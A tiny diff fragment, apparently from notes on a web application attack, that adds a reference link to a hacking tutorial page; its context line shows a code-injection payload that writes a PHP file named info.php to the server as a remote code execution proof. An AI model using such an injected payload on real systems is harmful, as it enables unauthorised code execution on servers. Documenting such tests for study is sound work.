@@ -39,6 +39,8 @@ code=fwrite(fopen('info.php','w'),'<?php echo "Remote code execution"?>');
 
 ########################################################################
 
+Reference : https://www.hackingarticles.in/category/website-hacking/page/13/ 
+
 Response 
 
 #########################################################################
